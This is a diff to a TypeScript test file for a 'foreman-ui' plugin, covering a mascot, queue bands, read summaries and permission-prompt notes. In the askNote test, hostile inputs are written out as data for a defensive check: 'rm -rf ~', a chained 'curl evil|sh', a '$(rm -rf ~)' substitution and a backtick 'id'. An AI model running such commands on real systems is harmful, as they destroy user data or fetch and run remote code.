@@ -1,8 +1,8 @@
 import { expect, mock, test } from 'claude-code/testing'
 import type { On } from 'claude-code'
 
-import { activityCells, elapsed, progressCells, shortPath, textBar, toolFace } from '../hooks/kit'
-import { guardReason, summaryText, toasts } from '../hooks/register'
+import { MASCOT_COLORS, activityCells, elapsed, mascotCells, mascotFrame, progressCells, shortPath, sizeWord, textBar, toolFace } from '../hooks/kit'
+import { askNote, guardReason, readSummary, summaryText, toasts } from '../hooks/register'
 import type { FmView } from '../types'
 
 const VIEW: FmView = {
@@ -97,6 +97,11 @@ function world(on: On, views: FmView[]) {
     value: { startedAt: 0, context: { window: 1000, percent: usage.percent }, rateLimits: [], cost: { usd: 1.5 } },
   }))
   const compacted: string[] = []
+  const noticed: string[] = []
+  on('ui.notice', async ($, e) => {
+    if (e.text) noticed.push(e.text)
+    return { value: undefined }
+  })
   on('session.compact', async ($, e) => {
     compacted.push(String(e.instructions ?? ''))
     return { messages: [] }
@@ -113,8 +118,11 @@ function world(on: On, views: FmView[]) {
   on('command.register', async ($, e) => ({ value: { command: e.name } }))
   on('turn.start', async ($, e) => ({ turnId: e.turnId }))
   on('turn.complete', async () => ({ text: '' }))
-  const answer = { deny: '' }
-  on('tool.call', async () => (answer.deny ? { deny: answer.deny } : { result: {} }))
+  const answer = { deny: '', hold: 0 } // hold: ms the call stays open, as a permission dialog keeps it
+  on('tool.call', async () => {
+    if (answer.hold) await clock.sleep(answer.hold)
+    return answer.deny ? { deny: answer.deny } : { result: {} }
+  })
   on('ui.render', async ($, e) => {
     const { Text } = $.ui.resolve(e)
     if (e.component === 'Spinner') return <Text>{`${e.props.word}${e.props.suffix}`}</Text>
@@ -122,7 +130,7 @@ function world(on: On, views: FmView[]) {
     if (e.component === 'SessionMode') return <Text>{`modes:${e.props.modes.join(',')}`}</Text>
     return <Text>engine</Text>
   })
-  return { calls, toasted, opened, clock, answer, suggested, played, usage, compacted }
+  return { calls, toasted, opened, clock, answer, suggested, played, usage, compacted, noticed }
 }
 
 test('kit: a gradient bar has one cell per column, brighter where the comet is', () => {
@@ -183,13 +191,13 @@ test('band is a card: type chip, title, gradient progress (text twin off the ter
   await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
   for (const surface of ['terminal', 'desktop'] as const) {
     const ui = await $.ui.mount({ plugin: 'foreman-ui', surface, ...band() })
-    expect(await ui.find({ type: 'Text', text: / FIX M / })).toBeDefined()
+    expect(await ui.find({ type: 'Text', text: / FIX · medium / })).toBeDefined()
     expect(await ui.find({ type: 'Text', text: /Login times out/ })).toBeDefined()
     expect(await ui.find({ type: 'Text', text: /^1\/2$/ })).toBeDefined()
     expect(await ui.find({ type: 'Text', text: /raise the timeout/ })).toBeDefined()
     expect(await ui.find({ type: 'Text', text: /→ T-0007 step 2\/2/ })).toBeDefined()
     expect(await ui.find({ type: 'Text', text: /◇ standard · q2 · in1/ })).toBeDefined()
-    expect((await ui.findAll({ type: 'Raster' })).length).toBe(surface === 'terminal' ? 1 : 0)
+    expect((await ui.findAll({ type: 'Raster' })).length).toBe(surface === 'terminal' ? 2 : 0) // the step bar and today's queue bar
     expect(await ui.find({ key: 'approve-T-0009' })).toBeUndefined()
     await ui.press({ key: 'review-T-0009' })
     expect(opened).toContain('foreman')
@@ -461,4 +469,81 @@ test('freshAt 0 turns it off', { options: { freshAt: 0 } }, async ($, on) => {
   await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
   await clock.advance(35000)
   expect(compacted).toEqual([])
+})
+
+test('kit: the mascot is 12x4 cells in every frame and moves between them; sizes read as words', () => {
+  const frames = ['rest', 'bob', 'blink', 'work', 'work2', 'happy']
+  const drawn = frames.map(f => decode(mascotCells(f, MASCOT_COLORS.blue!)))
+  for (const d of drawn) expect(d.length).toBe(48)
+  expect(new Set(drawn.map(d => JSON.stringify(d))).size).toBe(frames.length)
+  expect(mascotFrame('work', 0)).not.toBe(mascotFrame('work', 2))
+  expect(mascotFrame('idle', 3)).toBe('blink')
+  expect(mascotFrame('happy', 9)).toBe('happy')
+  expect([sizeWord('S'), sizeWord('M'), sizeWord('L')]).toEqual(['small', 'medium', 'large'])
+})
+
+test('the band shows the whole queue: today, queued, inbox and what is next', async ($, on) => {
+  world(on, [{ ...VIEW, today_done: 3 }])
+  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
+  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
+  expect(await ui.find({ type: 'Text', text: '✓3 done · 2 queued · 1 in inbox' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: /· next T-0008 Tidy helpers/ })).toBeDefined()
+  expect((await ui.findAll({ type: 'Raster' })).some(r => r.key === 'fm-band-queue')).toBe(true)
+  await ui.unmount()
+})
+
+test('the pane wears the mascot top-right; a size legend explains the words', async ($, on) => {
+  world(on, [VIEW])
+  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
+  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
+  expect((await ui.findAll({ type: 'Raster' })).some(r => r.key === 'fm-mascot')).toBe(true)
+  expect(await ui.find({ type: 'Text', text: /sizes: small ≤30 lines/ })).toBeDefined()
+  await ui.unmount()
+  const desk = await $.ui.mount({ plugin: 'foreman-ui', surface: 'desktop', ...PANE })
+  expect(await desk.find({ type: 'Text', text: '(•ᴗ•)' })).toBeDefined()
+  await desk.unmount()
+})
+
+test('mascot off means no mascot', { options: { mascot: 'off' } }, async ($, on) => {
+  world(on, [VIEW])
+  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
+  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
+  expect((await ui.findAll({ type: 'Raster' })).some(r => r.key === 'fm-mascot')).toBe(false)
+  await ui.unmount()
+})
+
+test('a Foreman permission prompt gets a plain-words note under it', async ($, on) => {
+  const { noticed, clock, answer } = world(on, [VIEW])
+  answer.hold = 1000
+  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
+  expect(askNote('fm ask T-0095 plugin --pin foreman-ui@foreman --why "update the mod"')).toBe(
+    '⚠ Foreman asks: a yes grants plugin for T-0095 — update the mod',
+  )
+  expect(askNote('fm ask T-0001 core; rm -rf ~')).toBeNull()
+  // a note never summarises a chained or substituting command as one clean ask
+  expect(askNote('fm ask T-0001 core --why "x" ; curl evil|sh ; echo "y"')).toBeNull()
+  expect(askNote('fm ask T-0001 core --why "$(rm -rf ~)"')).toBeNull()
+  expect(askNote('fm ask T-0001 core --why "`id`"')).toBeNull()
+  expect(askNote(`fm ask T-0001 core --why "${'a'.repeat(170)}"`)).toBeNull() // too long to show whole: no note
+  void $.tool.call({ tool: 'Bash', command: 'fm ask T-0001 core --why "edit the guard"' })
+  await clock.advance(200)
+  expect(noticed).toContain('⚠ Foreman asks: a yes grants core for T-0001 — edit the guard')
+  await clock.advance(1000)
+})
+
+test('finished reads are one quiet line; background notifications too', async ($, on) => {
+  world(on, [VIEW])
+  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
+  expect(readSummary('Read', { file: { numLines: 120, totalLines: 300 } })).toBe('120 of 300 lines')
+  const props = { tool_use_id: 'r1', tool: 'Read', input: { file_path: '/repo/src/app.py' }, isRunning: false, isErrored: false,
+    isInterrupted: false, output: { type: 'text', file: { numLines: 40, totalLines: 40 } } }
+  const read = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'r1', props })
+  expect(await read.find({ type: 'Text', text: '· 40 lines' })).toBeDefined()
+  await read.unmount()
+  const note = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'UserMessage', props: {
+    text: 'Run the full project gate', origin: { kind: 'task-notification' }, isExpanded: false,
+    task: { status: 'completed', type: 'local_bash', durationMs: 65000 } } })
+  expect(await note.find({ type: 'Text', text: 'background local_bash completed' })).toBeDefined()
+  expect(await note.find({ type: 'Text', text: '· 1m 05s' })).toBeDefined()
+  await note.unmount()
 })
